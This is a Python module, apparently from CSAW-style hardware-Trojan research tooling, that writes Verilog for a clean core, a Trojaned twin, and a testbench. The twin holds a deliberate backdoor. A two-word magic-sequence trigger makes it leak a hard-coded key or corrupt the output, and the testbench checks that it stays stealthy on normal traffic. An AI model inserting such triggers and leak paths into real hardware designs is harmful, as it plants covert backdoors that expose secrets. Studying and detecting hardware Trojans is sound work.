"""Emit real, synthesizable Verilog for a genome: a clean core, a Trojaned twin
gated by TROJAN_EN, and a self-checking testbench.

This is a *generic, parameterised* realisation of the CSAW pattern (one
`module core #(parameter TROJAN_EN=0)` whose EN=0 instance is provably clean,
compared against an EN=1 twin). It is deliberately small so a candidate can be
compiled and simulated in well under a second, which lets the training loop call
the *real* iverilog verifier as an occasional ground-truth audit of the
surrogate, exactly as challenge_1's tb_trojan does for the human pipeline.

The emitted core is an 8-stage data pipeline (stand-in for a crypto/FIR
datapath). The Trojan watches the input stream for a `trigger_bits`-wide magic
sequence; on firing it corrupts/leaks the output (payload). Non-trigger traffic
is bit-identical to the clean twin - that is what [STEALTH-OK] proves.
"""

from __future__ import annotations

import os

from .genome import TrojanGenome


_CLEAN = r"""
`default_nettype none
// Clean generic datapath core. TROJAN_EN=0 => provably trojan-free.
module core #(parameter TROJAN_EN = 0) (
    input  wire        clk,
    input  wire        rst_n,
    input  wire        in_valid,
    input  wire [31:0] in_data,
    output reg  [31:0] out_data,
    output reg         out_valid,
    output reg  [31:0] leak   // observable side channel (read path)
);
    reg [31:0] acc;
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            acc <= 32'h0; out_data <= 32'h0; out_valid <= 1'b0; leak <= 32'h0;
        end else begin
            out_valid <= in_valid;
            if (in_valid) begin
                acc      <= acc ^ (in_data + 32'h9E3779B9);
                out_data <= (in_data <<< 1) ^ (in_data >> 3);
            end
        end
    end
endmodule
"""


def _trojan_core(g: TrojanGenome) -> str:
    bits = int(round(g.trigger_bits()))
    bits = max(8, min(32, bits))              # the TB streams 32-bit words
    mask = (1 << bits) - 1
    magic1 = 0xDEADC0DE & mask
    magic2 = 0xFEEDFACE & mask
    # payload: leak a secret (exfil) or corrupt the output (corruption/dos/fault)
    exfil = g.payload in ("key_exfiltration", "auth_tag_bypass", "privilege_escalation")
    corrupt = not exfil
    secret = 0x8E043CB1                       # the challenge_1 device key, as a stand-in
    arm_line = f"if ((in_data & 32'h{mask:08X}) == 32'h{magic1:08X}) armed <= 1'b1;"
    fire_cond = f"armed && ((in_data & 32'h{mask:08X}) == 32'h{magic2:08X})"
    payload_lines = (
        f"leak <= 32'h{secret:08X};" if exfil
        else "out_data <= 32'hBADC0DE0;"
    )
    return f"""
`default_nettype none
// Trojaned twin: trigger={g.trigger} payload={g.payload} stealth={g.stealth}
// Entire Trojan gated by TROJAN_EN; EN=0 is bit-identical to the clean core.
module core #(parameter TROJAN_EN = 1) (
    input  wire        clk,
    input  wire        rst_n,
    input  wire        in_valid,
    input  wire [31:0] in_data,
    output reg  [31:0] out_data,
    output reg         out_valid,
    output reg  [31:0] leak
);
    reg [31:0] acc;
    reg        armed;
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            acc <= 32'h0; out_data <= 32'h0; out_valid <= 1'b0; leak <= 32'h0;
            armed <= 1'b0;
        end else begin
            out_valid <= in_valid;
            if (in_valid) begin
                acc      <= acc ^ (in_data + 32'h9E3779B9);
                out_data <= (in_data <<< 1) ^ (in_data >> 3);
                if (TROJAN_EN) begin
                    {arm_line}
                    if ({fire_cond}) begin
                        {payload_lines}
                        armed <= 1'b0;
                    end
                end
            end
        end
    end
endmodule
"""


def _testbench(g: TrojanGenome) -> str:
    bits = max(8, min(32, int(round(g.trigger_bits()))))
    mask = (1 << bits) - 1
    magic1 = 0xDEADC0DE & mask
    magic2 = 0xFEEDFACE & mask
    return f"""
`timescale 1ns/1ps
module tb_twin;
    reg clk=0, rst_n=0, in_valid=0;
    reg [31:0] in_data=0;
    wire [31:0] o_c, o_t, l_c, l_t;
    wire v_c, v_t;
    core #(.TROJAN_EN(0)) CLEAN (.clk(clk),.rst_n(rst_n),.in_valid(in_valid),
        .in_data(in_data),.out_data(o_c),.out_valid(v_c),.leak(l_c));
    core #(.TROJAN_EN(1)) TROJ  (.clk(clk),.rst_n(rst_n),.in_valid(in_valid),
        .in_data(in_data),.out_data(o_t),.out_valid(v_t),.leak(l_t));
    always #5 clk = ~clk;
    integer i; reg stealth_ok; reg trig_ok;
    reg [31:0] v;
    initial begin
        stealth_ok = 1'b1; trig_ok = 1'b0;
        @(negedge clk); rst_n = 1'b1;
        // 200 random non-trigger transactions: twins must stay bit-identical
        for (i=0;i<200;i=i+1) begin
            @(negedge clk);
            v = $random;
            if ((v & 32'h{mask:08X}) == 32'h{magic1:08X}) v = v ^ 32'h1;
            if ((v & 32'h{mask:08X}) == 32'h{magic2:08X}) v = v ^ 32'h1;
            in_data = v; in_valid = 1'b1;
            @(posedge clk); #1;
            if (o_c !== o_t || l_c !== l_t) stealth_ok = 1'b0;
        end
        // the knock: arm then fire
        @(negedge clk); in_data = 32'h{(0xDEADC0DE & mask):08X}; in_valid=1'b1; @(posedge clk); #1;
        @(negedge clk); in_data = 32'h{(0xFEEDFACE & mask):08X}; in_valid=1'b1; @(posedge clk); #1;
        @(negedge clk); in_valid=1'b0; @(posedge clk); #1;
        if (o_c !== o_t || l_c !== l_t) trig_ok = 1'b1;
        if (stealth_ok) $display("[STEALTH-OK] twins identical on 200 non-trigger words");
        else            $display("[LEAK] stealth broken on non-trigger traffic");
        if (trig_ok)    $display("[TRIGGER-OK] payload diverged the Trojaned twin");
        else            $display("[NO-FIRE] trigger did not fire");
        if (stealth_ok && trig_ok) $display("TF: ALL PASS");
        $finish;
    end
endmodule
"""


def emit_project(g: TrojanGenome, workdir: str) -> dict:
    os.makedirs(workdir, exist_ok=True)
    clean = os.path.join(workdir, "core_clean.v")
    troj = os.path.join(workdir, "core_trojan.v")
    tb = os.path.join(workdir, "tb_twin.v")
    with open(clean, "w") as f:
        f.write(_CLEAN)
    with open(troj, "w") as f:
        f.write(_trojan_core(g))
    with open(tb, "w") as f:
        f.write(_testbench(g))
    return {"clean": clean, "trojan": troj, "tb": tb}
